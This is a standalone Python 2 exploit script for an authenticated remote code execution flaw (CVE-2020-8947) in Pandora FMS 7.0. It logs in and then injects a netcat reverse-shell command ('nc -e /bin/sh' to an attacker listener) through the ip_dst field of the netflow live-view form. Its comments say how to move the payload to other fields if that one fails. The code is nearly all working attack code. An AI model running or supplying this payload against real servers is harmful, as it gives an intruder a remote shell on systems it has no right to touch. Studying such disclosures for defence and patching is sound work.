# Exploit Title: PANDORAFMS 7.0 - Authenticated Remote Code Execution
# Date: 2020-02-12
# Exploit Author: Engin Demirbilek
# Vendor homepage: http://pandorafms.org/
# Version: 7.0
# Software link: https://pandorafms.org/features/free-download-monitoring-software/
# Tested on: CentOS
# CVE: CVE-2020-8947

#!/bin/python
'''
PANDORAFMS 7.0 Authenticated Remote Code Execution x4
This exploits can be edited to exploit 4x Authenticated RCE vulnerabilities exist on PANDORAFMS.
incase default vulnerable variable won't work, change the position of payload to  one of the following ip_src, dst_port, src_port

Author: Engin Demirbilek
Github: github.com/EnginDemirbilek
CVE: CVE-2020-8947

'''
import requests
import sys

if len(sys.argv) < 6:
	print "Usage: ./exploit.py http://url username password listenerIP listenerPort"
	exit()

url = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
payload = '";nc -e /bin/sh ' + sys.argv[4] + ' ' + sys.argv[5] + ' ' + '#'

login = {
	'nick':user,
	'pass':password,
	'login_button':'Login'
}
req = requests.Session()
print "Sendin login request ..."
login = req.post(url+"/pandora_console/index.php?login=1", data=login)

payload = {
	'date':"",
	'time':"",
	'period':"",
	'interval_length':"",
	'chart_type':"",
	'max_aggregates':"1",
        'address_resolution':"0",
        'name':"",
        'assign_group':"0",
        'filter_type':"0",
        'filter_id':"0",
        'filter_selected':"0",
        'ip_dst':payload,
	'ip_src':"",
	'dst_port':"",
	'src_port':"",
	'advanced_filter':"",
	'aggregate':"dstip",
	'router_ip':"",
	'output':"bytes",
	'draw_button':"Draw"
}

print "[+] Sendin exploit ..."

exploit = req.post(url+"/pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0",cookies=req.cookies, data=payload, headers={
'User-Agent':'Mozilla/5.0 Gecko/20100101 Firefox/72.0',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Encoding':'gzip, deflate',
'Content-Type':'application/x-www-form-urlencoded'})

if exploit.status_code == 200:
	print "[+] Everything seems ok, check your listener. If no connection established, change position of payload to ip_src, dst_port or src_port."
else:
	print "[-] Couldn't send the HTTP request, try again."